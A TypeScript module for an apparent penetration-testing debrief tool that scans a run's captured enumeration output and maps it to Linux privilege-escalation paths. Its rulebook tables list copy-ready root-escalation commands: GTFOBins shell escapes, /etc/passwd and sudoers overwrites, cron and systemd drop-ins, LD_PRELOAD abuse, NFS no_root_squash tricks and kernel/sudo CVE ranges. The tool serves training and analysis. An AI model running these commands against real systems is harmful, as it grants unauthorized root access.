import type { WatcherReport, Finding } from "../../types/report";

/**
 * Deterministic privilege-escalation path analysis.
 *
 * Reads the enumeration the run already captured (episode commands + redacted output) and matches
 * it against a rulebook of known local-Linux privesc techniques, emitting confidence-tagged paths
 * from the current user to root — the same idea BloodHound gives for AD and RootHound
 * (github.com/Noz2/RootHound) gives for local privesc, folded into the debrief here.
 *
 * The rulebook facts are public (GTFOBins for SUID/SUDO/SGID/capabilities; NVD for the kernel/sudo
 * CVE version ranges) and re-expressed in TypeScript; nothing is copied from any GPL/unlicensed
 * source. Grow it like a rulebook: one more entry here makes the analysis smarter.
 *
 * This is coaching only. It never feeds the letter grade; it surfaces in the Privilege-Escalation
 * phase audit as "a confirmed root path was available" and, when a confirmed path was visible long
 * before the run actually rooted, as a "you took the slow line" late-privesc note.
 */

export type PrivescSeverity = "confirmed" | "likely" | "info";

export type PrivescVector =
  | "sudo"
  | "suid"
  | "sgid"
  | "cap"
  | "group"
  | "writable"
  | "systemd"
  | "nfs"
  | "ld-preload"
  | "kernel-cve"
  | "sudo-cve";

export interface PrivescPath {
  id: string;
  vector: PrivescVector;
  severity: PrivescSeverity;
  /** Short label, e.g. "SUID find" or "writable systemd dir". */
  title: string;
  /** Plain-English "what is it". */
  detail: string;
  /** Copy-ready abuse command / next action. */
  abuse: string;
  /** GTFOBins / NVD reference, when there is a canonical one. */
  ref?: string;
  /** Episode seq whose output surfaced the signal. */
  evidence_seq: number;
}

export interface PrivescResult {
  paths: PrivescPath[];
  confirmed: number;
  likely: number;
  /** Earliest seq at which a `confirmed` path was observable in the run. */
  first_confirmed_seq: number | null;
  /** Seq at which the run actually reached root (proven root flag / uid=0 / root shell), if any. */
  rooted_seq: number | null;
  /**
   * Set when a confirmed path was visible well before the run rooted AND root was reached by a
   * different, later vector — the RootHound "you had a faster line" signal. Coaching, never scored.
   */
  slow_line: { available_seq: number; rooted_seq: number; path: PrivescPath } | null;
}

// ─────────────────────────────────────────────────────────────────────────────
// RULEBOOK — public GTFOBins / NVD facts, re-expressed. Extend freely.
// ─────────────────────────────────────────────────────────────────────────────

const GTFOBINS_SUID: Record<string, string> = {
  bash: "bash -p", sh: "sh -p", find: "find . -exec /bin/sh -p \\; -quit",
  vim: "vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
  less: "less /etc/profile then !/bin/sh", more: "more /etc/profile then !/bin/sh",
  nmap: "nmap --interactive then !sh  (old versions only)",
  python: "python -c 'import os;os.setuid(0);os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
  python3: "python3 -c 'import os;os.setuid(0);os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
  perl: "perl -e 'exec \"/bin/sh\";'", awk: "awk 'BEGIN{system(\"/bin/sh\")}'",
  env: "env /bin/sh -p", tar: "tar checkpoint-action to run a command",
  gdb: "gdb -nx -ex 'python import os;os.setuid(0)' -ex '!sh' -ex quit",
  make: "make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\"", cp: "overwrite /etc/passwd or /etc/shadow",
  dd: "dd of=/etc/passwd  ->  write a root line", node: "node -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
  php: "php -r \"posix_setuid(0);system('/bin/sh');\"", ruby: "ruby -e 'Process::Sys.setuid(0);exec \"/bin/sh\"'",
  base64: "read any file: base64 /etc/shadow | base64 -d", cat: "read any root-owned file (/etc/shadow)",
  chmod: "chmod u+s /bin/bash  then  bash -p", docker: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
  sqlite3: "sqlite3 /dev/null '.shell /bin/sh -p'", systemctl: "systemctl link/enable a malicious unit",
};

const GTFOBINS_SUDO: Record<string, string> = {
  find: "sudo find . -exec /bin/sh \\; -quit", vim: "sudo vim -c ':!/bin/sh'",
  nano: "sudo nano  ->  ^R^X  reset; sh 1>&0 2>&0", less: "sudo less /etc/profile then !/bin/sh",
  more: "sudo more /etc/profile then !/bin/sh", man: "sudo man man then !/bin/sh",
  awk: "sudo awk 'BEGIN{system(\"/bin/sh\")}'", python: "sudo python -c 'import os;os.system(\"/bin/sh\")'",
  python3: "sudo python3 -c 'import os;os.system(\"/bin/sh\")'", perl: "sudo perl -e 'exec \"/bin/sh\";'",
  tar: "sudo tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh",
  env: "sudo env /bin/sh", make: "sudo make -s --eval=$'x:\\n\\t-/bin/sh'",
  git: "sudo git -p help config then !/bin/sh", gdb: "sudo gdb -nx -ex '!sh' -ex quit",
  docker: "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh", busybox: "sudo busybox sh",
  cp: "sudo cp your_passwd /etc/passwd   (overwrite as root)", dd: "sudo dd if=your_file of=/etc/passwd",
  tee: "echo '<you> ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers", apt: "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
  systemctl: "sudo systemctl -> pager escape !sh", vi: "sudo vi -c ':!/bin/sh'",
};

const GTFOBINS_SGID: Record<string, string> = {
  bash: "bash -p (egid=0 in many setups)", find: "find . -exec /bin/sh -p \\; -quit",
  python: "python -c 'import os,pty;os.setegid(0);pty.spawn(\"/bin/sh\")'",
  python3: "python3 -c 'import os,pty;os.setegid(0);pty.spawn(\"/bin/sh\")'",
  perl: "perl -e 'exec \"/bin/sh\";'", awk: "awk 'BEGIN{system(\"/bin/sh\")}'",
  vim: "vim -c ':!/bin/sh'", less: "less /etc/profile then !/bin/sh", nmap: "nmap --interactive then !sh (old)",
};

// (binary, capability) -> technique. "*" binary = any binary carrying that capability.
const GTFOBINS_CAPS: Record<string, string> = {
  "python|cap_setuid": "os.setuid(0); os.execl('/bin/sh','sh','-p')",
  "python3|cap_setuid": "os.setuid(0); os.execl('/bin/sh','sh','-p')",
  "perl|cap_setuid": "POSIX::setuid(0); exec '/bin/sh'",
  "php|cap_setuid": "posix_setuid(0); system('/bin/sh')",
  "ruby|cap_setuid": "Process::Sys.setuid(0); exec '/bin/sh'",
  "node|cap_setuid": "process.setuid(0); child_process spawn sh",
  "gdb|cap_setuid": "call setuid(0) then shell",
  "*|cap_dac_read_search": "read any file incl. /etc/shadow (cap_dac_read_search)",
  "*|cap_dac_override": "overwrite any file incl. /etc/passwd (cap_dac_override)",
  "*|cap_sys_admin": "very broad — mount/namespace escapes (cap_sys_admin)",
  "*|cap_sys_ptrace": "inject into a root process (cap_sys_ptrace)",
  "*|cap_sys_module": "load a kernel module -> instant root (cap_sys_module)",
  "*|cap_setuid": "setuid(0) then /bin/sh (cap_setuid on a shell-capable binary)",
};

// Group membership that leads to root. `direct` = confirmed (member => root), else likely.
const DANGEROUS_GROUPS: Record<string, { tech: string; direct: boolean }> = {
  docker: { tech: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", direct: true },
  lxd: { tech: "import alpine image, mount host / into container, chroot", direct: true },
  lxc: { tech: "mount host / via a privileged container", direct: true },
  disk: { tech: "debugfs /dev/sda -> read /etc/shadow (raw disk access)", direct: true },
  shadow: { tech: "read /etc/shadow directly -> crack root hash", direct: true },
  sudo: { tech: "you are in sudo group — check `sudo -l`", direct: false },
  wheel: { tech: "wheel group — often maps to sudo", direct: false },
  adm: { tech: "read log files (may leak creds) — not direct root", direct: false },
};

const SENSITIVE_WRITABLE: Record<string, string> = {
  "/etc/passwd": "add a root user: echo 'r00t:$1$x$...:0:0::/root:/bin/bash' >> /etc/passwd (openssl passwd -1)",
  "/etc/shadow": "overwrite root's hash with a known one (openssl passwd -6)",
  "/etc/sudoers": "add: <you> ALL=(ALL) NOPASSWD:ALL",
  "/etc/ld.so.preload": "point it at a malicious .so; loaded into every SUID binary -> root",
  "/etc/crontab": "add: * * * * * root cp /bin/bash /tmp/b; chmod +s /tmp/b",
};

// Writable directories that feed a root-run mechanism (prefix match).
const SENSITIVE_WRITABLE_DIRS: Record<string, string> = {
  "/etc/sudoers.d": "drop a file: echo '<you> ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/x",
  "/etc/cron.d": "drop a job: echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/x",
  "/etc/systemd/system": "drop/modify a .service (or drop-in) with ExecStart=your payload -> runs as root",
};

type Ver = [number, number, number];

const KERNEL_CVES: { name: string; cve: string; lo: Ver; hi: Ver; note: string }[] = [
  { name: "DirtyCow", cve: "CVE-2016-5195", lo: [2, 6, 22], hi: [4, 8, 3], note: "COW race; overwrites read-only root files. Reliable on legacy boxes." },
  { name: "DirtyPipe", cve: "CVE-2022-0847", lo: [5, 8, 0], hi: [5, 16, 11], note: "Overwrite any read-only file (/etc/passwd) or a root SUID binary. Very reliable, public PoC." },
  { name: "OverlayFS", cve: "CVE-2023-0386", lo: [5, 11, 0], hi: [6, 2, 0], note: "overlayfs cap copy-up -> SUID root binary. Common on Ubuntu/Debian." },
  { name: "nf_tables double-free", cve: "CVE-2024-1086", lo: [5, 14, 0], hi: [6, 8, 0], note: "Netfilter nf_tables -> root. Needs unprivileged user namespaces. In CISA KEV." },
];

const SUDO_CVES: { name: string; cve: string; ranges: [Ver, Ver][]; note: string }[] = [
  { name: "Baron Samedit", cve: "CVE-2021-3156", ranges: [[[1, 7, 7], [1, 7, 11]], [[1, 8, 2], [1, 8, 32]], [[1, 9, 0], [1, 9, 6]]], note: "Heap overflow via `sudoedit -s \\`. Root WITHOUT any sudo rule. Public PoC." },
  { name: "sudo chroot NSS", cve: "CVE-2025-32463", ranges: [[[1, 9, 14], [1, 9, 18]]], note: "sudo -R <dir> loads an attacker NSS .so as root. CVSS 9.3. No sudo rule needed." },
];

// ─────────────────────────────────────────────────────────────────────────────
// SIGNAL PARSING
// ─────────────────────────────────────────────────────────────────────────────

interface Signals {
  user: string;
  groups: string[];
  kernel: string | null;
  sudoVersion: string | null;
  sudoAll: boolean;
  ldPreload: boolean;
  sudoBins: Map<string, number>;   // bin -> evidence seq
  suid: Map<string, number>;
  sgid: Map<string, number>;
  caps: { bin: string; cap: string; seq: number }[];
  writable: Map<string, number>;   // path -> seq (files and dirs)
  nfs: Map<string, number>;
  rooted_seq: number | null;
}

const parseVer = (s: string | null | undefined): Ver | null => {
  const m = /(\d+)\.(\d+)(?:\.(\d+))?/.exec(s ?? "");
  return m ? [Number(m[1]), Number(m[2]), Number(m[3] ?? 0)] : null;
};
const vLte = (a: Ver, b: Ver) => a[0] < b[0] || (a[0] === b[0] && (a[1] < b[1] || (a[1] === b[1] && a[2] <= b[2])));
const vLt = (a: Ver, b: Ver) => vLte(a, b) && !(a[0] === b[0] && a[1] === b[1] && a[2] === b[2]);
const inRange = (v: Ver, lo: Ver, hi: Ver) => vLte(lo, v) && vLt(v, hi);

const basename = (p: string) => p.replace(/\/+$/, "").split("/").pop() ?? p;
const normBin = (p: string) => {
  const b = basename(p.trim()).replace(/\.basic$/, "");
  const m = /^(python|perl|ruby|php|node)(\d)?(?:\.\d+)?$/.exec(b);
  if (m) return m[2] === "3" ? m[1] + "3" : m[1];
  return b;
};

// Watcher's demo/live output packs logical lines onto one string with " · "; split on both so the
// same line matchers work on compressed fixtures and raw multi-line capture alike.
const toLines = (text: string): string[] => text.split(/\n|·/).map((l) => l.trim()).filter(Boolean);

const PERM_LINE = /^[-dlbcps][rwxsStT-]{9}\b/;
const isSuidSweep = (cmd: string) => /\bfind\b[^\n]*-perm[^\n]*\b(?:-?4000|\/[0-6]?4000|[-/]4000)\b/.test(cmd) || /-perm\s+-?4000/.test(cmd);
const isSgidSweep = (cmd: string) => /\bfind\b[^\n]*-perm[^\n]*\b(?:-?2000|\/2000)\b/.test(cmd);

function collectSignals(report: WatcherReport): Signals {
  const s: Signals = {
    user: "current-user", groups: [], kernel: null, sudoVersion: null, sudoAll: false, ldPreload: false,
    sudoBins: new Map(), suid: new Map(), sgid: new Map(), caps: [], writable: new Map(), nfs: new Map(), rooted_seq: null,
  };
  const put = (m: Map<string, number>, k: string, seq: number) => { if (!m.has(k)) m.set(k, seq); };

  for (const ep of report.episodes) {
    const cmd = ep.cmd ?? "";
    const text = ep.output_digest ?? "";
    const lines = toLines(text);

    // id / groups
    for (const ln of lines) {
      const m = /uid=\d+\(([^)]+)\).*groups=(.+)/.exec(ln);
      if (m) { s.user = m[1]; s.groups = [...m[2].matchAll(/\d+\(([^)]+)\)/g)].map((x) => x[1]); }
    }
    // kernel version — from a `uname` command's output ("Linux <host> 5.13.0-39-generic ...") or a
    // "Linux version x.y.z" banner anywhere in output.
    if (!s.kernel) {
      const m = /\buname\b/.test(cmd) ? /(\d+\.\d+\.\d+[-\w.]*)/.exec(text) : /Linux version (\d+\.\d+\.\d+[-\w.]*)/.exec(text);
      if (m) s.kernel = m[1];
    }
    // sudo version
    if (!s.sudoVersion) { const m = /[Ss]udo version (\d+\.\d+\.\d+\w*)/.exec(text); if (m) s.sudoVersion = m[1]; }

    // sudo -l grants
    if (/\bsudo\s+-l\b/.test(cmd) || /may run the following commands/i.test(text) || /NOPASSWD/.test(text)) {
      for (const ln of lines) {
        if (/\(\s*ALL(?:\s*:\s*ALL)?\s*\)\s*ALL\b/.test(ln)) s.sudoAll = true;
        if (/env_keep/i.test(ln) && /(ld_preload|ld_library_path)/i.test(ln)) s.ldPreload = true;
        // Requiring `(ALL|root)` already excludes the "User x may run the following commands:" header,
        // so no "may run" guard is needed — and real output often puts the header and the first grant
        // on the same line. Only skip the Defaults line.
        const g = /\((?:ALL|root)[^)]*\)\s*(?:(?:NOPASSWD|SETENV|PASSWD|NOEXEC):\s*)*(.+)$/.exec(ln);
        if (g && !/matching defaults/i.test(ln)) {
          const rest = g[1].trim();
          if (rest !== "ALL" && rest !== "ALL ALL") for (const p of rest.match(/\/[^\s,]+/g) ?? []) put(s.sudoBins, normBin(p), ep.seq);
        }
      }
    }

    // SUID / SGID — perm-prefixed listing OR the output of a `find -perm ...4000` sweep
    const suidSweep = isSuidSweep(cmd), sgidSweep = isSgidSweep(cmd);
    for (const ln of lines) {
      if (PERM_LINE.test(ln)) {
        const pm = /\s(\/\S+)/.exec(ln);
        if (pm) { if ("sS".includes(ln[3])) put(s.suid, normBin(pm[1]), ep.seq); if ("sS".includes(ln[6])) put(s.sgid, normBin(pm[1]), ep.seq); }
      } else if (suidSweep || sgidSweep) {
        for (const p of ln.match(/\/[A-Za-z0-9_./-]+/g) ?? []) { if (suidSweep) put(s.suid, normBin(p), ep.seq); if (sgidSweep) put(s.sgid, normBin(p), ep.seq); }
      }
    }

    // capabilities — "/usr/bin/python3.11 = cap_setuid+ep" / "... cap_setuid+ep"
    for (const ln of lines) {
      if (!/cap_/i.test(ln) || /http/i.test(ln)) continue;
      const cm = /(\/\S+)\s*(?:=\s*)?(cap_[a-z_]+)/i.exec(ln);
      if (cm) s.caps.push({ bin: normBin(cm[1]), cap: cm[2].toLowerCase(), seq: ep.seq });
    }

    // NFS no_root_squash
    for (const ln of lines) if (/no_root_squash/.test(ln)) { const m = /(\/\S+)\s+.*no_root_squash/.exec(ln); put(s.nfs, m ? m[1] : ln.split(/\s+/)[0], ep.seq); }

    // writable sensitive files (exact) — either an ls -l line flagged writable, or LinPEAS phrasing
    for (const path of Object.keys(SENSITIVE_WRITABLE)) if (text.includes(path) && (/writ/i.test(text) || lines.includes(path))) put(s.writable, path, ep.seq);

    // writable sensitive directory (prefix) — e.g. a group-writable systemd drop-in dir:
    //   `ls -ld /etc/systemd/system/smbd.service.d/` -> "drwxrwxr-x 2 root operators ... group-writable"
    for (const dir of Object.keys(SENSITIVE_WRITABLE_DIRS)) {
      if (!(cmd.includes(dir) || text.includes(dir))) continue;
      const groupWritable = lines.some((ln) => PERM_LINE.test(ln) && "wW".includes(ln[6]));
      if (/writ/i.test(text) || groupWritable || lines.some((ln) => /^d[rwxsStT-]{9}/.test(ln) && "wt".includes(ln[8]))) put(s.writable, dir, ep.seq);
    }

    // reached root: a proven root flag, a uid=0 / root@ shell, or an explicit "as root" marker
    if (s.rooted_seq == null) {
      const rooted = /uid=0\(root\)/.test(text) || /root@\S+[:#]/.test(text) || /\brunning as root\b/i.test(text)
        || (/(?:^|\s)#\s*(?:—|-|$)/.test(text) && /root|euid|\-p\b/i.test(text));
      if (rooted) s.rooted_seq = ep.seq;
    }
  }

  // proven root flag is the strongest "you rooted here" signal
  const rootFlag = (report.findings ?? []).find((f: Finding) => f.kind === "flag" && /root|proof/i.test(f.id) && f.proven);
  if (rootFlag && (s.rooted_seq == null || rootFlag.source_seq < s.rooted_seq)) s.rooted_seq = rootFlag.source_seq;

  return s;
}

// ─────────────────────────────────────────────────────────────────────────────
// PATH BUILDING
// ─────────────────────────────────────────────────────────────────────────────

const GTFO_ALIAS: Record<string, string> = { python3: "python", python2: "python" };
const KNOWN_GTFO = new Set([...Object.keys(GTFOBINS_SUID), ...Object.keys(GTFOBINS_SUDO), ...Object.keys(GTFOBINS_SGID)]);
function gtfoRef(bin: string, ctx: "suid" | "sudo" | "capabilities" | "") {
  if (!KNOWN_GTFO.has(bin) && !KNOWN_GTFO.has(GTFO_ALIAS[bin] ?? bin)) return "https://gtfobins.github.io/";
  const page = GTFO_ALIAS[bin] ?? bin;
  return `https://gtfobins.github.io/gtfobins/${page}/` + (ctx && ctx !== "capabilities" ? `#${ctx}` : ctx === "capabilities" ? "#capabilities" : "");
}

export function analyzePrivesc(report: WatcherReport): PrivescResult {
  const s = collectSignals(report);
  const paths: PrivescPath[] = [];
  const add = (p: PrivescPath) => paths.push(p);

  if (s.sudoAll) add({ id: "sudo:ALL", vector: "sudo", severity: "confirmed", title: "sudo ALL", detail: "You may run any command as root via sudo.", abuse: "sudo -i   # or: sudo su -", ref: "https://gtfobins.github.io/", evidence_seq: report.episodes.find((e) => /sudo\s+-l/.test(e.cmd))?.seq ?? 0 });

  for (const [bin, seq] of s.sudoBins) {
    const tech = GTFOBINS_SUDO[bin];
    add({ id: `sudo:${bin}`, vector: "sudo", severity: tech ? "confirmed" : "likely", title: `sudo ${bin}`,
      detail: `You may run \`${bin}\` as root via sudo${tech ? "" : " (not in the rulebook — check GTFOBins)"}.`,
      abuse: tech ?? `sudo ${bin}   # look for a shell/file-write escape on GTFOBins`, ref: gtfoRef(bin, "sudo"), evidence_seq: seq });
  }

  for (const [bin, seq] of s.suid) {
    const tech = GTFOBINS_SUID[bin];
    if (tech) add({ id: `suid:${bin}`, vector: "suid", severity: "confirmed", title: `SUID ${bin}`, detail: `\`${bin}\` has the SUID bit, so it runs as its owner (root) whoever launches it.`, abuse: tech, ref: gtfoRef(bin, "suid"), evidence_seq: seq });
    else add({ id: `suid:${bin}`, vector: "suid", severity: "info", title: `SUID ${bin}`, detail: `\`${bin}\` is SUID-root but has no known GTFOBins escape — investigate manually.`, abuse: `${bin}   # no known GTFOBins SUID escape`, ref: gtfoRef(bin, "suid"), evidence_seq: seq });
  }

  for (const [bin, seq] of s.sgid) { const tech = GTFOBINS_SGID[bin]; if (tech) add({ id: `sgid:${bin}`, vector: "sgid", severity: "confirmed", title: `SGID ${bin}`, detail: `\`${bin}\` has the SGID bit — it runs with its owning group's privileges.`, abuse: tech, ref: gtfoRef(bin, ""), evidence_seq: seq }); }

  for (const { bin, cap, seq } of s.caps) {
    const core = cap.split(/[+,=]/)[0];
    const tech = GTFOBINS_CAPS[`${bin}|${core}`] ?? GTFOBINS_CAPS[`*|${core}`];
    add({ id: `cap:${bin}:${core}`, vector: "cap", severity: tech ? "confirmed" : "likely", title: `cap ${bin} ${core}`,
      detail: `\`${bin}\` carries the ${core} capability — a targeted root-ish power baked into the binary.`,
      abuse: tech ?? `${bin} has ${core} — check the GTFOBins capabilities page.`, ref: gtfoRef(bin, "capabilities"), evidence_seq: seq });
  }

  for (const g of s.groups) { const d = DANGEROUS_GROUPS[g]; if (d) add({ id: `group:${g}`, vector: "group", severity: d.direct ? "confirmed" : "likely", title: `group ${g}`, detail: `Your user is in the \`${g}\` group${d.direct ? ", which grants root-equivalent power on this box" : ""}.`, abuse: d.tech, evidence_seq: report.episodes.find((e) => /\b(id|groups)\b/.test(e.cmd))?.seq ?? 0 }); }

  for (const [path, seq] of s.writable) {
    if (SENSITIVE_WRITABLE[path]) { add({ id: `writable:${path}`, vector: "writable", severity: "confirmed", title: `writable ${path}`, detail: `${path} is writable by your user — a sensitive system file you shouldn't be able to touch.`, abuse: SENSITIVE_WRITABLE[path], evidence_seq: seq }); continue; }
    const dir = Object.keys(SENSITIVE_WRITABLE_DIRS).find((d) => path === d || path.startsWith(d));
    if (dir) add({ id: `writable:${path}`, vector: dir.includes("systemd") ? "systemd" : "writable", severity: "confirmed", title: dir.includes("systemd") ? "writable systemd dir" : `writable ${path}`, detail: `${path} is a writable directory that feeds a root-run mechanism.`, abuse: SENSITIVE_WRITABLE_DIRS[dir], ref: dir.includes("systemd") ? "https://gtfobins.github.io/" : undefined, evidence_seq: seq });
  }

  if (s.ldPreload) add({ id: "ld-preload", vector: "ld-preload", severity: "confirmed", title: "sudo keeps LD_PRELOAD", detail: "sudo keeps LD_PRELOAD/LD_LIBRARY_PATH (env_keep) — preload a malicious library into any sudo-allowed command.", abuse: "gcc -fPIC -shared -o /tmp/x.so evil.c && sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>", evidence_seq: report.episodes.find((e) => /sudo\s+-l/.test(e.cmd))?.seq ?? 0 });

  for (const [share, seq] of s.nfs) add({ id: `nfs:${share}`, vector: "nfs", severity: "confirmed", title: `NFS ${share} no_root_squash`, detail: `${share} is NFS-exported with no_root_squash — a SUID root binary you create on an attacker box stays root here.`, abuse: `# on attacker (root): mount -o rw <ip>:${share} /mnt/x; cp /bin/bash /mnt/x/sh; chmod +s /mnt/x/sh\n# on target: ${share}/sh -p`, evidence_seq: seq });

  if (s.kernel) for (const k of KERNEL_CVES) { const v = parseVer(s.kernel); if (v && inRange(v, k.lo, k.hi)) add({ id: `kcve:${k.cve}`, vector: "kernel-cve", severity: "likely", title: `${k.name} (${k.cve})`, detail: `Kernel ${s.kernel} falls in the affected range — but version alone isn't proof; distros backport fixes.`, abuse: `${k.note}\n# verify: searchsploit ${k.cve} / run linux-exploit-suggester`, ref: `https://nvd.nist.gov/vuln/detail/${k.cve}`, evidence_seq: 0 }); }
  if (s.sudoVersion) for (const c of SUDO_CVES) { const v = parseVer(s.sudoVersion); if (v && c.ranges.some(([lo, hi]) => inRange(v, lo, hi))) add({ id: `scve:${c.cve}`, vector: "sudo-cve", severity: "likely", title: `${c.name} (${c.cve})`, detail: `sudo ${s.sudoVersion} falls in the affected range for ${c.cve}. Confirm before firing.`, abuse: `${c.note}\n# verify: searchsploit ${c.cve}`, ref: `https://nvd.nist.gov/vuln/detail/${c.cve}`, evidence_seq: 0 }); }

  const order: Record<PrivescSeverity, number> = { confirmed: 0, likely: 1, info: 2 };
  paths.sort((a, b) => order[a.severity] - order[b.severity] || a.evidence_seq - b.evidence_seq);

  const confirmedPaths = paths.filter((p) => p.severity === "confirmed");
  const first_confirmed_seq = confirmedPaths.length ? Math.min(...confirmedPaths.map((p) => p.evidence_seq)) : null;

  // "Slow line": a confirmed path was visible, yet the run burned real effort — detours, loops,
  // failed attempts — before finally rooting. This is the RootHound-style counterfactual, and unlike
  // the Ghost it needs no write-up: the signals came from the run's own output. Crucially it keys on
  // *wasted effort* in the gap, not raw distance, so a run that goes straight from "path on the table"
  // to root through clean exploitation steps (write drop-in -> reload -> restart -> root) is NOT flagged.
  let slow_line: PrivescResult["slow_line"] = null;
  if (first_confirmed_seq != null && s.rooted_seq != null && s.rooted_seq > first_confirmed_seq) {
    const wasted = report.episodes.filter(
      (e) => e.seq > first_confirmed_seq! && e.seq < s.rooted_seq! &&
        (e.alignment === "detour" || e.loop_of_seq != null || (e.exit_code != null && e.exit_code !== 0)),
    ).length;
    if (wasted >= 2) {
      const earliest = confirmedPaths.reduce((a, b) => (b.evidence_seq < a.evidence_seq ? b : a));
      slow_line = { available_seq: first_confirmed_seq, rooted_seq: s.rooted_seq, path: earliest };
    }
  }

  return { paths, confirmed: confirmedPaths.length, likely: paths.filter((p) => p.severity === "likely").length, first_confirmed_seq, rooted_seq: s.rooted_seq, slow_line };
}
